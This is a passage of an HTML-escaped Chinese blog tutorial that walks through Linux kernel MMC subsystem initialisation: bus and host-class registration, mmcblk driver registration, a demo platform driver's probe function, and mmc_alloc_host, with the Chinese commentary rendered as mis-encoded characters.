&lt;div class=&quot;highlight&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;  drivers/mmc/core/core.c  &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
subsys_initcall(mmc_init);

&lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; __init mmc_init(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; ret;

    ret &lt;/span&gt;=&lt;span&gt; mmc_register_bus();
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (ret)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ret;

    ret &lt;/span&gt;=&lt;span&gt; mmc_register_host_class();
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (ret)
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt;&lt;span&gt; unregister_bus;

    ret &lt;/span&gt;=&lt;span&gt; sdio_register_bus();
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (ret)
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt;&lt;span&gt; unregister_host_class;

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

unregister_host_class:
    mmc_unregister_host_class();
unregister_bus:
    mmc_unregister_bus();
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ret;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;15&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;**********************************************************
 * mmc bus æ€»çº¿æ³¨å†Œ
 **********************************************************&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; bus_type mmc_bus_type =&lt;span&gt; {
    .name       &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmc&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    .dev_groups &lt;/span&gt;=&lt;span&gt; mmc_dev_groups,
    .match      &lt;/span&gt;=&lt;span&gt; mmc_bus_match,
    .uevent     &lt;/span&gt;=&lt;span&gt; mmc_bus_uevent,
    .probe      &lt;/span&gt;=&lt;span&gt; mmc_bus_probe,
    .remove     &lt;/span&gt;=&lt;span&gt; mmc_bus_remove,
    .shutdown   &lt;/span&gt;=&lt;span&gt; mmc_bus_shutdown,
    .pm         &lt;/span&gt;= &amp;amp;&lt;span&gt;mmc_bus_pm_ops,
};

&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; mmc_register_bus(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)
{
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; bus_register(&amp;amp;&lt;span&gt;mmc_bus_type);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;**********************************************************
 * mmc_host class ç±»æ³¨å†Œ
 **********************************************************&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; mmc_host_class =&lt;span&gt; {
    .name           &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmc_host&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
    .dev_release    &lt;/span&gt;=&lt;span&gt; mmc_host_classdev_release,
};

&lt;/span&gt;&lt;span&gt;int&lt;/span&gt; mmc_register_host_class(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)
{
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; class_register(&amp;amp;&lt;span&gt;mmc_host_class);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;ä¸»è¦åŒ…æ‹¬ä¸¤ä¸ªæ–¹é¢ï¼š&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;åˆ©ç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;bus_register()&lt;/span&gt;Â æ³¨å†ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_bus&lt;/span&gt;Â ã€‚å¯¹åº”sysfsä¸‹çš„Â &lt;span class=&quot;cnblogs_code&quot;&gt;/sys/bus/mmc/&lt;/span&gt;Â ç›®å½•ã€‚&lt;/li&gt;
&lt;li&gt;åˆ©ç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;class_register()&lt;/span&gt;Â æ³¨å†ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_host_class&lt;/span&gt;Â ã€‚å¯¹åº”&lt;span&gt;sysfs&lt;/span&gt;ä¸‹çš„Â &lt;span class=&quot;cnblogs_code&quot;&gt;/sys/&lt;span&gt;class&lt;/span&gt;/mmc_host&lt;/span&gt;Â ç›®å½•ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;drivers/mmc/core/block.c&lt;/span&gt;Â ä¸­å°†Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_driver&lt;/span&gt;Â æ³¨å†Œåˆ°Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_bus&lt;/span&gt;Â å¯¹åº”çš„æ€»çº¿ç³»ç»Ÿé‡Œã€‚ä¸»è¦æ­¥éª¤åŒ…æ‹¬ï¼š&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;é€šè¿‡Â &lt;span class=&quot;cnblogs_code&quot;&gt;register_blkdev()&lt;/span&gt;Â å‘å†…æ ¸æ³¨å†Œå—è®¾å¤‡ã€‚&lt;/li&gt;
&lt;li&gt;è°ƒç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;driver_register()&lt;/span&gt;Â å°†Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_driver&lt;/span&gt;Â æ³¨å†Œåˆ°Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_bus&lt;/span&gt;Â æ€»çº¿ç³»ç»Ÿã€‚å’Œå…¶ä»–é©±åŠ¨æ³¨å†Œæ–¹å¼ä¸€è‡´ã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_driver&lt;/span&gt;Â æ³¨å†Œå®Œæˆä¹‹åï¼Œä¼šåœ¨sysfsä¸­å»ºç«‹ç›®å½•Â &lt;span class=&quot;cnblogs_code&quot;&gt;/sys/bus/mmc/drivers/mmcblk&lt;/span&gt;Â ã€‚&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;11&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;  drivers/mmc/core/block.c  &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;

module_init(mmc_blk_init);

&lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; mmc_driver mmc_driver =&lt;span&gt; {
    .drv        &lt;/span&gt;=&lt;span&gt; {
        .name   &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmcblk&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
        .pm     &lt;/span&gt;= &amp;amp;&lt;span&gt;mmc_blk_pm_ops,
    },
    .probe      &lt;/span&gt;=&lt;span&gt; mmc_blk_probe,
    .remove     &lt;/span&gt;=&lt;span&gt; mmc_blk_remove,
    .shutdown   &lt;/span&gt;=&lt;span&gt; mmc_blk_shutdown,
};

&lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; __init mmc_blk_init(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; res;

    ...  ...
    res &lt;/span&gt;= register_blkdev(MMC_BLOCK_MAJOR, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmc&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    ...

    res &lt;/span&gt;= mmc_register_driver(&amp;amp;&lt;span&gt;mmc_driver);
    ...

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    ... ...
}

&lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;*
 *  mmc_register_driver - register a media driver
 *  @drv: MMC media driver
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;int&lt;/span&gt; mmc_register_driver(&lt;span&gt;struct&lt;/span&gt; mmc_driver *&lt;span&gt;drv)
{
    drv&lt;/span&gt;-&amp;gt;drv.bus = &amp;amp;&lt;span&gt;mmc_bus_type;
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; driver_register(&amp;amp;drv-&amp;gt;&lt;span&gt;drv);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;&lt;span&gt;å‰æ–‡å·²ç»ç®€å•æè¿°è¿‡ï¼ŒMMCè®¾å¤‡ä¸»è¦åŒ…æ‹¬ä¸»è®¾å¤‡hostå’Œä»è®¾å¤‡cardä¸¤éƒ¨åˆ†ï¼Œè€Œä¸»è®¾å¤‡hostå°†è¢«å°è£…åœ¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;platform_device&lt;/span&gt;Â ä¸­æ³¨å†Œåˆ°é©±åŠ¨æ¨¡å‹ä¸­ã€‚&lt;/span&gt;&lt;br/&gt;&lt;span&gt;ä¸ºäº†æ›´åŠ æ¸…æ™°åœ°æè¿°æ­¤éƒ¨åˆ†çš„æ³¨å†Œè¿‡ç¨‹ï¼Œä¸‹æ–‡å°†ä»¥ä¸€ä¸ªé©±åŠ¨ä¸ºä¾‹åˆ†æï¼ˆæ­¤é©±åŠ¨æºç åªåŒ…å«å…³é”®æ­¥éª¤ä»£ç ï¼Œåªä¸ºæè¿°MMCé©±åŠ¨çš„ç¼–å†™åŸºæœ¬æ¡†æ¶ï¼Œ&lt;a href=&quot;https://github.com/hughesxu/workspace/blob/master/linux_modules/mmc/klm_mmc.c&quot;&gt;demo mmc driver&lt;/a&gt;)ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;32&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;14&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;module_init(xxx_mmc_init);

&lt;/span&gt;&lt;span&gt;#define&lt;/span&gt; DRIVER_NAME &quot;xxx_mmc&quot;

&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; platform driver definition &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; platform_driver xxx_mmc_driver =&lt;span&gt; {
    .probe      &lt;/span&gt;=&lt;span&gt; xxx_mmc_probe,
    .remove     &lt;/span&gt;=&lt;span&gt; xxx_mmc_remove,
    .driver     &lt;/span&gt;=&lt;span&gt; {
        .name   &lt;/span&gt;=&lt;span&gt; DRIVER_NAME,
    },
};

&lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; platform_device *&lt;span&gt;pdev;
&lt;/span&gt;&lt;span&gt;static&lt;/span&gt; __init &lt;span&gt;int&lt;/span&gt; xxx_mmc_init(&lt;span&gt;void&lt;/span&gt;&lt;span&gt;)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; err  = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;
     * Register platform driver into driver model
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; å°†xxx_mmc_driveræ³¨å†Œåˆ°é©±åŠ¨æ¨¡å‹ä¸­&lt;/span&gt;
    err = platform_driver_register(&amp;amp;&lt;span&gt;xxx_mmc_driver);

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;
     * Allocate platform device and register into driver model
     * This will call driver-&amp;gt;probe()
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; åŠ¨æ€åˆ†é…platform_deviceï¼Œå¹¶å°†å…¶æ³¨å†Œåˆ°é©±åŠ¨æ¨¡å‹ä¸­
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; æ­¤è¿‡ç¨‹ä¼šå›è°ƒdriver-&amp;gt;probe()å‡½æ•°&lt;/span&gt;
    pdev = platform_device_alloc(DRIVER_NAME, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
    err &lt;/span&gt;=&lt;span&gt; platform_device_add(pdev);

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; err;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Â ä»ä»£ç ä¸­çœ‹åˆ°ï¼Œé©±åŠ¨å…¥å£å‡½æ•°ä¸­å°†æ³¨å†ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;platform_driver&lt;/span&gt;Â å’ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;platform_device&lt;/span&gt;Â ï¼ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;name&lt;/span&gt;Â å‡å®šä¹‰ä¸ºÂ &lt;span class=&quot;cnblogs_code&quot;&gt;xxx_mmc&lt;/span&gt;Â ã€‚æ ¹æ®é©±åŠ¨æ¨¡å‹ï¼Œæœ€ç»ˆä¼šå›è°ƒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;xxx_mmc_driver&lt;/span&gt;Â ä¸­çš„Â &lt;span class=&quot;cnblogs_code&quot;&gt;probe()&lt;/span&gt;Â å‡½æ•°ï¼šÂ &lt;span class=&quot;cnblogs_code&quot;&gt;xxx_mmc_probe()&lt;/span&gt;Â ã€‚&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;41-xxx_mmc_probepdev&quot;&gt;&lt;span&gt;4.1 xxx_mmc_probe(pdev)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot; readability=&quot;31&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;12&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt; è‡ªå®šä¹‰çš„mmc_host_opsï¼Œç”¨äºhoståšå®é™…æ“ä½œæ—¶å›è°ƒ&lt;/span&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;struct&lt;/span&gt; mmc_host_ops xxx_mmc_ops =&lt;span&gt; {
    .request    &lt;/span&gt;=&lt;span&gt; xxx_mmc_request,
    .set_ios    &lt;/span&gt;=&lt;span&gt; xxx_mmc_set_ios,
};


&lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; platform driver probe function &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; xxx_mmc_probe(&lt;span&gt;struct&lt;/span&gt; platform_device *&lt;span&gt;pdev)
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host *&lt;span&gt;mmc;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; xxx_mmc_host *host =&lt;span&gt; NULL;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; ret = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Step 1: Allocate host structure &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; ç¬¬1æ­¥ï¼šåŠ¨æ€åˆ†é…mmc_hostç»“æ„&lt;/span&gt;
    mmc = mmc_alloc_host(&lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;struct&lt;/span&gt; xxx_mmc_host), &amp;amp;pdev-&amp;gt;&lt;span&gt;dev);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (mmc ==&lt;span&gt; NULL) {
        pr_err(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;alloc host failed\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        ret &lt;/span&gt;= -&lt;span&gt;ENOMEM;
        &lt;/span&gt;&lt;span&gt;goto&lt;/span&gt;&lt;span&gt; err_alloc_host;
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; pointer initialization&lt;/span&gt;
    host =&lt;span&gt; mmc_priv(mmc);
    host&lt;/span&gt;-&amp;gt;mmc =&lt;span&gt; mmc;

    host&lt;/span&gt;-&amp;gt;id = pdev-&amp;gt;&lt;span&gt;id;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Step 2: Initialize struct mmc_host &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; ç¬¬2æ­¥ï¼šåˆå§‹åŒ–mmc_hostçš„ç»“æ„æˆå‘˜&lt;/span&gt;
    mmc-&amp;gt;ops        = &amp;amp;&lt;span&gt;xxx_mmc_ops;
    mmc&lt;/span&gt;-&amp;gt;f_min      = &lt;span&gt;400000&lt;/span&gt;&lt;span&gt;;
    mmc&lt;/span&gt;-&amp;gt;f_max      = &lt;span&gt;52000000&lt;/span&gt;&lt;span&gt;;
    mmc&lt;/span&gt;-&amp;gt;ocr_avail  =&lt;span&gt; MMC_VDD_32_33;
    mmc&lt;/span&gt;-&amp;gt;caps       = MMC_CAP_8_BIT_DATA |  MMC_CAP_NONREMOVABLE |&lt;span&gt; MMC_CAP_MMC_HIGHSPEED;
    mmc&lt;/span&gt;-&amp;gt;caps2      = MMC_CAP2_BOOTPART_NOACC |&lt;span&gt; MMC_CAP_PANIC_WRITE;

    mmc&lt;/span&gt;-&amp;gt;max_segs       = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    mmc&lt;/span&gt;-&amp;gt;max_blk_size   = &lt;span&gt;512&lt;/span&gt;&lt;span&gt;;
    mmc&lt;/span&gt;-&amp;gt;max_req_size   = &lt;span&gt;65536&lt;/span&gt;;                &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Maximum number of bytes in one req&lt;/span&gt;
    mmc-&amp;gt;max_blk_count  = mmc-&amp;gt;max_req_size/mmc-&amp;gt;max_blk_size;  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Maximum number of blocks in one req&lt;/span&gt;
    mmc-&amp;gt;max_seg_size   = mmc-&amp;gt;max_req_size;    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Segment size in one req, in bytes&lt;/span&gt;
&lt;span&gt;
    host&lt;/span&gt;-&amp;gt;dev = &amp;amp;pdev-&amp;gt;&lt;span&gt;dev;

    platform_set_drvdata(pdev, host);       &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; pdev-&amp;gt;dev-&amp;gt;driver_data = host&lt;/span&gt;

    &lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Step 3: Register the host with driver model &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; ç¬¬3æ­¥ï¼šå°†mmc_hostæ³¨å†Œåˆ°é©±åŠ¨æ¨¡å‹ä¸­&lt;/span&gt;
&lt;span&gt;    mmc_add_host(mmc);

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

err_alloc_host:
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; ret;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Â Â &lt;span class=&quot;cnblogs_code&quot;&gt;xxx_mmc_probe(pdev)&lt;/span&gt;Â ä¸»è¦å·¥ä½œå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;è°ƒç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_alloc_host()&lt;/span&gt;Â åˆ†é…ä¸€ä¸ªÂ &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host&lt;/span&gt;Â ç»“æ„ã€‚&lt;/li&gt;
&lt;li&gt;å¯¹Â &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host&lt;/span&gt;Â ç»“æ„ä½“æˆå‘˜åˆå§‹åŒ–ã€‚&lt;/li&gt;
&lt;li&gt;è°ƒç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_add_host()&lt;/span&gt;Â &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;å°†Â &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host&lt;/span&gt;Â &lt;/code&gt;åŠ å…¥åˆ°é©±åŠ¨æ¨¡å‹ä¸­ã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;42-mmc_alloc_hostsizeofstruct-xxx_mmc_host-pdev-dev&quot;&gt;&lt;span&gt;4.2 mmc_alloc_host(sizeof(struct xxx_mmc_host), &amp;amp;pdev-&amp;gt;dev)&lt;/span&gt;&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;13&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;  drivers/mmc/core/host.c  &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;

&lt;span&gt;static&lt;/span&gt;&lt;span&gt; DEFINE_IDA(mmc_host_ida);

&lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;  mmc_alloc_host - initialise the per-host structure. &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;struct&lt;/span&gt; mmc_host *mmc_alloc_host(&lt;span&gt;int&lt;/span&gt; extra, &lt;span&gt;struct&lt;/span&gt; device *&lt;span&gt;dev)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; err;
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host *&lt;span&gt;host;

    host &lt;/span&gt;= kzalloc(&lt;span&gt;sizeof&lt;/span&gt;(&lt;span&gt;struct&lt;/span&gt; mmc_host) +&lt;span&gt; extra, GFP_KERNEL);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;host)
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NULL;

    &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; scanning will be enabled when we're ready &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    host&lt;/span&gt;-&amp;gt;rescan_disable = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Allocate an unused ID&lt;/span&gt;
    err = ida_simple_get(&amp;amp;mmc_host_ida, &lt;span&gt;0&lt;/span&gt;, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;, GFP_KERNEL);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (err &amp;lt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;) {
        kfree(host);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NULL;
    }

    host&lt;/span&gt;-&amp;gt;index =&lt;span&gt; err;

    dev_set_name(&lt;/span&gt;&amp;amp;host-&amp;gt;class_dev, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;mmc%d&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, host-&amp;gt;&lt;span&gt;index);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; æ­¤å¤„å¯ä»¥ç¨å¾®æ³¨æ„ä¸€ä¸‹ï¼Œhost-&amp;gt;class_devçš„ç±»classè®¾ç½®ä¸ºmmc_host_class
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; å¹¶ä¸”host-&amp;gt;class_devçš„parentæŒ‡å‘äº†pdev-&amp;gt;dev (platform_device)
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; è¿™äº›è®¸çš„å·®å¼‚ä¼šæ”¹å˜device_addååœ¨sysfsä¸­è¡¨ç°å‡ºæ¥çš„å±‚æ¬¡ç»“æ„&lt;/span&gt;
    host-&amp;gt;parent = dev;                     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; host-&amp;gt;parent = &amp;amp;pdev-&amp;gt;dev&lt;/span&gt;
    host-&amp;gt;class_dev.parent = dev;           &lt;span&gt;//&lt;/span&gt;&lt;span&gt; host-&amp;gt;class_dev.parent = &amp;amp;pdev-&amp;gt;dev&lt;/span&gt;
    host-&amp;gt;class_dev.&lt;span&gt;class&lt;/span&gt; = &amp;amp;&lt;span&gt;mmc_host_class; 

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Initialize host-&amp;gt;class_dev&lt;/span&gt;
    device_initialize(&amp;amp;host-&amp;gt;&lt;span&gt;class_dev);
    device_enable_async_suspend(&lt;/span&gt;&amp;amp;host-&amp;gt;&lt;span&gt;class_dev);

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (mmc_gpio_alloc(host)) {
        put_device(&lt;/span&gt;&amp;amp;host-&amp;gt;&lt;span&gt;class_dev);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; NULL;
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; åˆå§‹åŒ–è‡ªæ—‹é”&lt;/span&gt;
    spin_lock_init(&amp;amp;host-&amp;gt;&lt;span&gt;lock&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; åˆå§‹åŒ–ç­‰å¾…é˜Ÿåˆ—å¤´&lt;/span&gt;
    init_waitqueue_head(&amp;amp;host-&amp;gt;&lt;span&gt;wq);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; åˆå§‹åŒ–å»¶è¿Ÿçš„å·¥ä½œé˜Ÿåˆ—`host-&amp;gt;detect`å’Œ`host-&amp;gt;sdio_irq_work`&lt;/span&gt;
    INIT_DELAYED_WORK(&amp;amp;host-&amp;gt;&lt;span&gt;detect, mmc_rescan);
    INIT_DELAYED_WORK(&lt;/span&gt;&amp;amp;host-&amp;gt;&lt;span&gt;sdio_irq_work, sdio_irq_work);
    timer_setup(&lt;/span&gt;&amp;amp;host-&amp;gt;retune_timer, mmc_retune_timer, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);

    host&lt;/span&gt;-&amp;gt;max_segs = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    host&lt;/span&gt;-&amp;gt;max_seg_size =&lt;span&gt; PAGE_SIZE;

    host&lt;/span&gt;-&amp;gt;max_req_size =&lt;span&gt; PAGE_SIZE;
    host&lt;/span&gt;-&amp;gt;max_blk_size = &lt;span&gt;512&lt;/span&gt;&lt;span&gt;;
    host&lt;/span&gt;-&amp;gt;max_blk_count = PAGE_SIZE / &lt;span&gt;512&lt;/span&gt;&lt;span&gt;;

    host&lt;/span&gt;-&amp;gt;fixed_drv_type = -&lt;span&gt;EINVAL;
    host&lt;/span&gt;-&amp;gt;ios.power_delay_ms = &lt;span&gt;10&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; host;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ä¸»è¦å·¥ä½œå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
